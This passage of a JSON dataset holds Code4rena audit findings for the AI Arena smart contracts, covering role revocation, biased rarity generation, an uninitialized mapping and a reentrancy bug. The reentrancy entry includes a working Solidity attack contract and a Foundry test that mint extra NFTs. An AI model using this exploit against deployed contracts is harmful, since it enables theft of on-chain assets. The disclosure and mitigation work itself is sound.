\\#1670](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1670#issuecomment-1985801932)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16\n\n**Status:** Not fully mitigated. Full details in reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/8) and niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/29), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/13)), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue in the code of the AI Arena game, specifically in the FighterFarm and MergingPool contracts. The problem is that when creating fighters through the mintFromMergingPool function, there is no check on the input values for weight and element, which can result in fighters with arbitrary and potentially harmful values. This could have a negative impact on battles within the game. The report includes a proof of concept and a recommended mitigation step of checking and restricting the input values for weight and element. The issue has been confirmed and partially mitigated by the AI Arena team, but further reports have found that the mitigation is not fully effective.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932",
      "tags": [],
      "finders": [
        "Tumelo\\_Crypto",
        "0xvj",
        "ahmedaghadi",
        "kiqo",
        "Tendency",
        "givn",
        "Blank\\_Space",
        "cats",
        "agadzhalov",
        "MrPotatoMagic",
        "Silvermist",
        "klau5",
        "juancito",
        "ke1caM",
        "visualbits",
        "pkqs90",
        "aslanbek",
        "krikolkk",
        "denzi\\_",
        "SpicyMeatball",
        "haxatron",
        "FloatingPragma",
        "ktg",
        "Topmark",
        "Matue",
        "d3e4",
        "\\_eperezok",
        "immeas",
        "handsomegiraffe",
        "dutra",
        "Draiakoo",
        "0xDetermination",
        "yotov721",
        "stakog",
        "sl1",
        "0xWallSecurity",
        "alexxander",
        "BARW",
        "0xlemon",
        "0xRiO",
        "evmboi32",
        "McToady",
        "vnavascues",
        "Giorgio",
        "fnanni",
        "peter",
        "niser93",
        "rspadi",
        "0xCiphky",
        "AlexCzm",
        "petro\\_1912"
      ]
    },
    {
      "id": "32192",
      "title": "[M-02] Minter / Staker / Spender roles can never be revoked",
      "impact": "MEDIUM",
      "content": "\nFrom [Neuron::addMinter](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/Neuron.sol#L93-L96) and [AccessControl::setupRole](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/access/AccessControl.sol#L194-L207)\n\n```solidity\n    function addMinter(address newMinterAddress) external {\n        require(msg.sender == _ownerAddress);\n        _setupRole(MINTER_ROLE, newMinterAddress);\n    }\n\n    function _setupRole(bytes32 role, address account) internal virtual {\n        _grantRole(role, account);\n    }\n\n    function _grantRole(bytes32 role, address account) internal virtual {\n        if (!hasRole(role, account)) {\n            _roles[role].members[account] = true;\n            emit RoleGranted(role, account, _msgSender());\n        }\n    }\n\n```\n\n*   Roles of minter, staker, spender can never be revoked due to missing default admin implementation. The `DEFAULT_ADMIN_ROLE` = 0x00 which is default role which is admin to all the roles, and the real contract owner should  own this role, since it is not granted, the owner cannot govern the roles.\n\n*   Another wrong implemnatation is using `_setupRole` to grant roles intead of using `_grantRole`, because of the warnings in the library contract.\n\nFrom [Openzeppelin::AccessControl](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/access/AccessControl.sol#L40-L47) and [AccessControl::setupRole](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/access/AccessControl.sol#L194-L207)\n\n```solidity\n\n* [WARNING]\n    * ====\n    * This function should only be called from the constructor when setting\n    * up the initial roles for the system.\n    *\n    * Using this function in any other way is effectively circumventing the admin\n    * system imposed by {AccessControl}.\n    * ====\n    *\n    * NOTE: This function is deprecated in favor of {_grantRole}.\n    */\n    function _setupRole(bytes32 role, address account) internal virtual {\n        _grantRole(role, account);\n    }\n\n    * Roles can be granted and revoked dynamically via the {grantRole} and\n    * {revokeRole} functions. Each role has an associated admin role, and only\n    * accounts that have a role's admin role can call {grantRole} and {revokeRole}.\n    *\n    * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means\n    * that only accounts with this role will be able to grant or revoke other\n    * roles. More complex role relationships can be created by using\n    * {_setRoleAdmin}.\n    *\n    * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to\n    * grant and revoke this role. Extra precautions should be taken to secure\n    * accounts that have been granted it.\n    */\n\n```\n\n### Proof of Concept\n\n*   As you can see the owner cannot revoke becasue there is no admin for that role, owner should be a default admin for all the roles granted.\n\n```\n[PASS] test_POC_Revoke() (gas: 72392)\nTraces:\n  [72392] NeuronTest::test_POC_Revoke() \n    â”œâ”€ [27181] Neuron::addMinter(NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) \n    â”‚   â”œâ”€ emit RoleGranted(role: 0x9f2df0fed2c77648de5860a4cc508cd0818c85b8b8a1ab4ceeef8d981c8956a6, account: NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], sender: NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [0] VM::expectRevert() \n    â”‚   â””â”€ â† ()\n    â”œâ”€ [34420] Neuron::revokeRole(0x9f2df0fed2c77648de5860a4cc508cd0818c85b8b8a1ab4ceeef8d981c8956a6, NeuronTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) \n    â”‚   â””â”€ â† \"AccessControl: account 0x7fa9385be102ac3eac297483dd6233d62b3e1496 is missing role 0x0000000000000000000000000000000000000000000000000000000000000000\"\n    â””â”€ â† ()\n```\n\n- Now paste the below POC into [test/Neuron.t.sol](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/test/Neuron.t.sol#L39) and run `forge t --mt test_POC_Revoke -vvvv`.\n\n```solidity\n\n    function test_POC_Revoke() external {\n        _neuronContract.addMinter(_ownerAddress);\n\n        vm.expectRevert();\n        _neuronContract.revokeRole(keccak256(\"MINTER_ROLE\"), _ownerAddress);\n    }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nModify the constructor on [Neuron.sol](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/Neuron.sol#L68-L77) to grant default admin role to owner.\n\n```diff\n    constructor(address ownerAddress, address treasuryAddress_, address contributorAddress)\n        ERC20(\"Neuron\", \"NRN\")\n    {\n        _ownerAddress = ownerAddress;\n        treasuryAddress = treasuryAddress_;\n        isAdmin[_ownerAddress] = true;\n        _mint(treasuryAddress, INITIAL_TREASURY_MINT);\n        _mint(contributorAddress, INITIAL_CONTRIBUTOR_MINT);\n\n+       _grantRole(DEFAULT_ADMIN_ROLE, _ownerAddress);\n    }\n```\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507#issuecomment-1978135833):**\n > Selecting as best report because it also mentions that `_grantRole` should be used instead of `_setupRole`.\n > \n > I'm excluding admin error in this. Simply about functionality: not being able to revoke roles might be problematic for deprecation / migration purposes.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue found in the code for a smart contract called Neuron. The code in question is responsible for granting and revoking certain roles, such as minter, staker, and spender. However, the code has a few flaws that make it impossible to revoke these roles.\n\nThe first issue is that there is no default admin for the roles, meaning that the contract owner cannot govern them. This is because the default admin role, which is usually responsible for managing all other roles, has not been granted to the owner. As a result, the owner cannot revoke any roles.\n\nThe second issue is that the code uses the function `_setupRole` to grant roles, instead of using the recommended function `_grantRole`. This is a problem because the library contract warns against using `_setupRole` in this way, as it bypasses the admin system put in place by the contract.\n\nTo demonstrate this issue, a proof of concept has been provided that shows how the owner is unable to revoke a role. This is a problem because it means that roles cannot be revoked for deprecation or migration purposes.\n\nTo fix this issue, the constructor on Neuron.sol should be modified to grant the default admin role to the owner, using the function `_grantRole`. This will allow the owner to govern the roles and revoke them if needed.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507",
      "tags": [],
      "finders": [
        "3",
        "josephdara",
        "0xvj",
        "Greed",
        "Timenov",
        "SovaSlava",
        "zaevlad",
        "favelanky",
        "0xblackskull",
        "klau5",
        "juancito",
        "SpicyMeatball",
        "0xgrbr",
        "btk",
        "\\_eperezok",
        "PetarTolev",
        "0xE1",
        "c0pp3rscr3w3r",
        "lil\\_eth",
        "sandy",
        "nuthan2x",
        "alexxander",
        "Tychai0s",
        "kutugu",
        "McToady",
        "1",
        "merlinboii",
        "2",
        "shaflow2",
        "pynschon",
        "jesjupyter"
      ]
    },
    {
      "id": "32191",
      "title": "[M-01] Almost all rarity rank combinations cannot be, and are not uniformly, generated",
      "impact": "MEDIUM",
      "content": "\nOnly a tiny fraction, 0.0002427\\%, of all rarity rank combinations are possible.\nThe probability distribution of the possible combinations (assuming the DNA is uniformly random) is not uniform: 24\\% of combinations are twice as likely as the rest.\n\n### Proof of Concept\n\n`AiArenaHelper.createPhysicalAttributes()` may set six `finalAttributeProbabilityIndexes` using [the following calculation](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L107-L109).\n\n```solidity\nuint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;\nuint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);\nfinalAttributeProbabilityIndexes[i] = attributeIndex;\n```\n\n`attributeToDnaDivisor` [is by default `[2, 3, 5, 7, 11, 13]`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L20). Each `rarityRank` by itself is in the range `0..99`, and ostensibly the total number of combinations of the six `rarityRank`s should then be 100\\^6. However, only 2,427,000 different combinations are possible, which is only 0.0002427\\% of all combinations that should be possible.\n\nAs a function of `dna` the vector of the six `rarityRank`s repeats every 3,003,000 integers (=2 &bull; 3 &bull; 5 &bull; 7 &bull; 11 &bull; 13 &bull; 100). But it turns out that 576,000 of these appear twice. For example, a `dna` of `0` or `1` yield the same combination of `rarityRank`s (`[0,0,0,0,0,0]`), as do `16` and `17` (`[8,5,3,2,1,1]`), and `22` and `23` (`[11,7,4,3,2,1]`), etc.\nThat is, about 24\\% of the combinations are twice as likely as the rest.\n\nThe `rarityRank`s are input to `dnaToIndex()` which then will also be biased and restricted in output (depending on the attribute probabilities).\n\n### Recommended Mitigation Steps\n\nExtract multiple small random numbers by repeatedly taking the modulo and dividing. I.e.\n\n```diff\n- uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;\n+ uint256 rarityRank = dna % 100;\n+ dna /= 100;\n```\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1979#issuecomment-1999028030):**\n > Agree that `rarityRank` determination isn't uniformly random.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a problem in the code for a game called \"AiArena\". The report states that only a very small percentage of possible combinations of attributes for characters in the game are actually possible. This is due to a calculation in the code that is not random enough, causing certain combinations to be more likely than others. The report recommends a solution to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1979",
      "tags": [],
      "finders": [
        "fnanni",
        "d3e4",
        "niser93"
      ]
    },
    {
      "id": "32190",
      "title": "[H-08] Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on the `claimRewards() function`",
      "impact": "HIGH",
      "content": "\nWhen a fighting round ends, winners for the current round get picked and allocated respective rewards. These rewards are fighter NFTs that can be claimed by such winners. When you claim your rewards for a round or several rounds, the `numRoundsClaimed` state variable which stores the number of rounds you've claimed for gets updated to reflect your claim and each winner can only ever claim up to the amounts they win for each given round. That means if you try to batch-claim for two given rounds for which you won 2 fighter NFTs, your NFT count after the claim should be whatever your current balance of NFT is plus 2 fighter NFTs.\n\nThe issue here is that there's a way to mint additional fighter NFTs on top of the fighter NFTs you're owed for winning even though the `claimRewards` function has implemented a decent system to prevent over-claims. For one, it's relatively complex to spoof a call pretending to be the `_mergingPoolAddress` to mint but a malicious user doesn't need to worry too much about that to mint more fighters; they just need to leverage using a smart contract for engineering a simple reentrancy.\n\n### Proof of Concept\n\nConsider this call path that allows a malicious user to reach this undesired state:\n\n1.  In-session fight round gets finalized.\n2.  An admin picks winners for the just finalized round.\n3.  Alice, one of the winners is entitled to 2 fighter NFTs just like Bob and decides to claim rewards for the rounds she participated in but keep in mind she joined the game with a smart contract.\n4.  Alice calls `claimRewards` supplying the args `(string[] calldata modelURIs, string[] calldata modelTypes, uint256[2][] calldata customAttributes)`\n5.  Those are valid arguments, hence the loop proceeds to make 2 NFT mints to her address.\n6.  Her address, being a smart contract manages to reenter the call to mint additional NFTs.\n7.  Alice ends up with more fighter NFTs instead of 2. Bob, who is an EOA gets the 2 NFTs he's owed but Alice has managed to gain more.\n\nThe root cause of this issue stems from the `roundId`. The amount of times you can reenter the `claimRewards` function depends on the `roundId`. So let's say the `roundId` is 3, it mints 6 NFTs:\n\n*   First loop mints once\n*   Reenter mints the second time\n*   Reenter again mints the third time\n*   Cannot reenter anymore\n*   Control is released so the call goes back to the second loop & finishes the mint\n*   Call goes back & finishes the second and third mint\n*   Alice or malicious caller ends up with 6 NFTs instead of 3\n\nHere's a POC to show one such attack path in the code\nPlace the code in the `MergingPool.t.sol` test contract and do the setup: `testReenterPOC` is the attack POC test\n\nAttack contract:\n\n<details>\n\n```js\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\ncontract Attack is IERC721Receiver {\n    \n    address owner;\n    uint256 tickets = 0;\n    MergingPool mergingPool;\n    FighterFarm fighterFarm;\n\n    constructor(address mergingPool_, address fighterFarm_) {\n        mergingPool = MergingPool(mergingPool_);\n        fighterFarm = FighterFarm(fighterFarm_);\n        owner = msg.sender;\n    }\n    function reenter() internal {\n        ++tickets;\n        if (tickets < 100) {\n            (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();\n            mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n        }\n    }\n\n    function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {\n        reenter();\n        return IERC721Receiver.onERC721Received.selector;\n    }\n    function attack() public {\n        (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();\n        mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n    } \n\n    function setInformation() public pure returns (string[] memory, string[] memory, uint256[2][] memory) {\n        string[] memory _modelURIs = new string[](3);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[2] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        string[] memory _modelTypes = new string[](3);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        _modelTypes[2] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](3);\n        _customAttributes[0][0] = uint256(1);\n        _customAttributes[0][1] = uint256(80);\n        _customAttributes[1][0] = uint256(1);\n        _customAttributes[1][1] = uint256(80);\n        _customAttributes[2][0] = uint256(1);\n        _customAttributes[2][1] = uint256(80);\n\n        return (_modelURIs, _modelTypes, _customAttributes);\n    }  \n}\n```\n\n```js\n    function testReenterPOC() public {\n\n        address Bob = makeAddr(\"Bob\");\n        Attack attacker = new Attack(address(_mergingPoolContract), address(_fighterFarmContract));\n        \n        _mintFromMergingPool(address(attacker));\n        _mintFromMergingPool(Bob);\n\n        assertEq(_fighterFarmContract.ownerOf(0), address(attacker));\n        assertEq(_fighterFarmContract.ownerOf(1), Bob);\n\n        uint256[] memory _winners = new uint256[](2);\n        _winners[0] = 0;\n        _winners[1] = 1;\n\n         // winners of roundId 0 are picked\n        _mergingPoolContract.pickWinner(_winners);\n        assertEq(_mergingPoolContract.isSelectionComplete(0), true);  \n        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == address(attacker), true);\n        // winner matches ownerOf tokenId\n        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == Bob, true);\n\n        string[] memory _modelURIs = new string[](2);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        \n        string[] memory _modelTypes = new string[](2);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](2);\n        _customAttributes[0][0] = uint256(1);\n        _customAttributes[0][1] = uint256(80);\n        _customAttributes[1][0] = uint256(1);\n        _customAttributes[1][1] = uint256(80);\n        // winners of roundId 1 are picked\n\n        uint256 numberOfRounds = _mergingPoolContract.roundId();\n        console.log(\"Number of Rounds: \", numberOfRounds);\n\n        _mergingPoolContract.pickWinner(_winners);\n        _mergingPoolContract.pickWinner(_winners);\n\n        console.log(\"------------------------------------------------------\");\n\n        console.log(\"Balance of attacker (Alice) address pre-claim rewards: \", _fighterFarmContract.balanceOf(address(attacker)));\n        // console.log(\"Balance of Bob address pre-claim rewards: \", _fighterFarmContract.balanceOf(Bob));\n\n\n        uint256 numRewardsForAttacker = _mergingPoolContract.getUnclaimedRewards(address(attacker));\n        \n        // uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);\n\n        console.log(\"------------------------------------------------------\");\n\n        console.log(\"Number of unclaimed rewards attacker (Alice) address has a claim to: \", numRewardsForAttacker);\n        // console.log(\"Number of unclaimed rewards Bob address has a claim to: \", numRewardsForBob);\n        \n        // vm.prank(Bob);\n        // _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n\n        vm.prank(address(attacker));\n        attacker.attack();\n\n        uint256 balanceOfAttackerPostClaim = _fighterFarmContract.balanceOf(address(attacker));\n\n        console.log(\"------------------------------------------------------\");\n        console.log(\"Balance of attacker (Alice) address post-claim rewards: \", balanceOfAttackerPostClaim);\n        // console.log(\"Balance of Bob address post-claim rewards: \", _fighterFarmContract.balanceOf(Bob));\n\n    }\n```\n</details>\n\nMalicious user leveraging reentrancy test result:\n\n<details>\n\n```js\n[PASS] testReenterPOC() (gas: 3999505)\nLogs:\n  Number of Rounds:  1\n  ------------------------------------------------------\n  Balance of attacker (Alice) address pre-claim rewards:  1\n  ------------------------------------------------------\n  Number of unclaimed rewards attacker (Alice) address has a claim to:  3\n  ------------------------------------------------------\n  Balance of attacker (Alice) address post-claim rewards:  7\n```\n\nNon-malicious users test POC:\n\n```js\nfunction testNormalEOAClaim() public {\n        _mintFromMergingPool(_ownerAddress);\n        _mintFromMergingPool(_DELEGATED_ADDRESS);\n        \n        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);\n        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);\n\n        uint256[] memory _winners = new uint256[](2);\n        _winners[0] = 0;\n        _winners[1] = 1;\n\n        // winners of roundId 0 are picked\n        _mergingPoolContract.pickWinner(_winners);\n        assertEq(_mergingPoolContract.isSelectionComplete(0), true);\n        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);\n        // winner matches ownerOf tokenId\n        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);\n\n        string[] memory _modelURIs = new string[](2);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n\n        string[] memory _modelTypes = new string[](2);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](2);\n        _customAttributes[0][0] = uint256(1);\n        _customAttributes[0][1] = uint256(80);\n        _customAttributes[1][0] = uint256(1);\n        _customAttributes[1][1] = uint256(80);\n        // winners of roundId 1 are picked\n\n        uint256 numberOfRounds = _mergingPoolContract.roundId();\n        console.log(\"Number of Rounds: \", numberOfRounds);\n\n        _mergingPoolContract.pickWinner(_winners);\n\n        console.log(\"Balance of owner address pre-claim rewards: \", _fighterFarmContract.balanceOf(address(this)));\n        console.log(\"Balance of delegated address pre-claim rewards: \", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));\n\n\n        uint256 numRewardsForWinner = _mergingPoolContract.getUnclaimedRewards(_ownerAddress);\n        \n        uint256 numRewardsForDelegated = _mergingPoolContract.getUnclaimedRewards(_DELEGATED_ADDRESS);\n        // emit log_uint(numRewardsForWinner);\n\n        console.log(\"Number of unclaimed rewards owner address has a claim to: \", numRewardsForWinner);\n        console.log(\"Number of unclaimed rewards delegated address has a claim to: \", numRewardsForDelegated);\n\n        // winner claims rewards for previous roundIds\n        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n        vm.prank(_DELEGATED_ADDRESS);\n        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n\n        console.log(\"Balance of owner address post-claim rewards: \", _fighterFarmContract.balanceOf(address(this)));\n        console.log(\"Balance of delegated address post-claim rewards: \", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));\n    }\n```\n</details>\n\nNon-malicious users doing a normal claim result:\n\n```js\n[PASS] testNormalEOAClaim() (gas: 2673123)\nLogs:\n  Number of Rounds:  1\n  Balance of owner address pre-claim rewards:  1\n  Balance of delegated address pre-claim rewards:  1\n  Number of unclaimed rewards owner address has a claim to:  2\n  Number of unclaimed rewards delegated address has a claim to:  2\n  Balance of owner address post-claim rewards:  3\n  Balance of delegated address post-claim rewards:  3\n```\n\n### Recommended Mitigation Steps\n\nUse a `nonReentrant` modifier for the `claimRewards` function.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37#issuecomment-1975461186)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/6\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/28), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/47), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/27).\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report discusses a vulnerability in the AI Arena smart contract. The contract allows winners of a fighting round to claim rewards in the form of fighter NFTs. However, there is a flaw in the code that allows a malicious user to mint additional NFTs on top of the ones they are owed. This can be achieved by using a smart contract to reenter the `claimRewards` function multiple times, resulting in the user receiving more NFTs than they should. This issue is caused by the `roundId` variable, which determines the number of times a user can reenter the function. By manipulating this variable, a malicious user can gain more NFTs than they are entitled to. A proof of concept is provided to demonstrate this attack. \n\nTo mitigate this issue, the contract should use a `nonReentrant` modifier for the `claimRewards` function. This will prevent users from reentering the function multiple times and gaining additional NFTs. The AI Arena team has confirmed this vulnerability and implemented the recommended mitigation steps. The issue has been resolved and the contract is now secure.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "0brxce",
        "bhilare\\_",
        "PedroZurdo",
        "djxploit",
        "grearlake",
        "zxriptor",
        "BoRonGod",
        "solmaxis69",
        "MrPotatoMagic",
        "ZanyBonzy",
        "klau5",
        "ke1caM",
        "0xBinChook",
        "web3pwn",
        "haxatron",
        "immeas",
        "jnforja",
        "Aymen0909",
        "0xDetermination",
        "Tricko",
        "sl1",
        "alexxander",
        "Zac",
        "BARW",
        "rouhsamad",
        "evmboi32",
        "0xLogos",
        "Krace",
        "Kow",
        "DarkTower",
        "0xCiphky",
        "sashik\\_eth",
        "ubl4nk"
      ]
    },
    {
      "id": "32189",
      "title": "[H-07] Fighters cannot be minted after the initial generation due to uninitialized `numElements` mapping",
      "impact": "HIGH",
      "content": "\nIn `FighterFarm.sol` there is a mapping `numElements` which stores the number of possible types of elements a fighter can have in a generation:\n\n[FighterFarm.sol#L84-L85](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L84-L85)\n\n```solidity\n    /// @notice Mapping of number elements by generation.\n    mapping(uint8 => uint8) public numElements;\n```\n\nBut the problem here is that only the initial generation, Generation 0, is initialized to 3, in the `numElements` mapping during the constructor of `FighterFarm.sol`.\n\n[FighterFarm.sol#L100-L111](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L100-L111)\n\n```solidity\n    /// @notice Sets the owner address, the delegated address.\n    /// @param ownerAddress Address of contract deployer.\n    /// @param delegatedAddress Address of delegated signer for messages.\n    /// @param treasuryAddress_ Community treasury address.\n    constructor(address ownerAddress, address delegatedAddress, address treasuryAddress_)\n        ERC721(\"AI Arena Fighter\", \"FTR\")\n    {\n        _ownerAddress = ownerAddress;\n        _delegatedAddress = delegatedAddress;\n        treasuryAddress = treasuryAddress_;\n        numElements[0] = 3;\n    } \n```\n\nIt is therefore not possible to write to the `numElements` mapping for any other generations. As they are uninitialized, `numElements[i] = 0` when `i != 0`\n\nMoreover, this `numElements` mapping is read from when creating a fighter.\n\n[FighterFarm.sol#L458-L474](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L458-L474)\n\n```solidity\n    /// @notice Creates the base attributes for the fighter.\n    /// @param dna The dna of the fighter.\n    /// @param fighterType The type of the fighter.\n    /// @return Attributes of the new fighter: element, weight, and dna.\n    function _createFighterBase(\n        uint256 dna, \n        uint8 fighterType\n    ) \n        private \n        view \n        returns (uint256, uint256, uint256) \n    {\n=>      uint256 element = dna % numElements[generation[fighterType]]; // numElements is 0 when generation[fighterType] != 0.\n        uint256 weight = dna % 31 + 65;\n        uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);\n        return (element, weight, newDna);\n    }\n```\n\nTherefore if the protocol updates to a new generation of fighters, it will not be able to create anymore new fighters as `numElements[generation[fighterType]]` will be uninitialized and therefore equal 0. This will cause the transaction to always revert as any modulo by 0 will cause a panic [according to Solidity Docs](https://docs.soliditylang.org/en/latest/types.html#:\\~:text=Modulo%20with%20zero%20causes%20a%20Panic%20error.%20This%20check%20can%20not%20be%20disabled%20through%20unchecked%20%7B%20...%20%7D.)\n\n> Modulo with zero causes a Panic error. This check can not be disabled through unchecked { ... }.\n\n### Recommended Mitigation Steps\n\nAllow the admin to update the `numElements` mapping when a new generation is created.\n\n**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45#issuecomment-1960006144):**\n > Missing `numElements[generation[fighterType]]` setter.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45#issuecomment-1984292251)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/7\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/23), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/46), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/26).\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem in the code of `FighterFarm.sol` where a mapping called `numElements` is not initialized correctly for all generations of fighters. This means that when trying to create new fighters, the code will always fail and the transaction will revert. This is because the code tries to read from the `numElements` mapping but it is uninitialized for any generation other than the first one. The recommended solution is to allow the admin to update the `numElements` mapping when a new generation is created. The bug has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45",
      "tags": [],
      "finders": [
        "VrONTg",
        "0xvj",
        "EagleSecurity",
        "14si2o\\_Flint",
        "t0x1c",
        "shaka",
        "soliditywala",
        "0xAlix2",
        "0xaghas",
        "cartlex\\_",
        "MidgarAudits",
        "Ryonen",
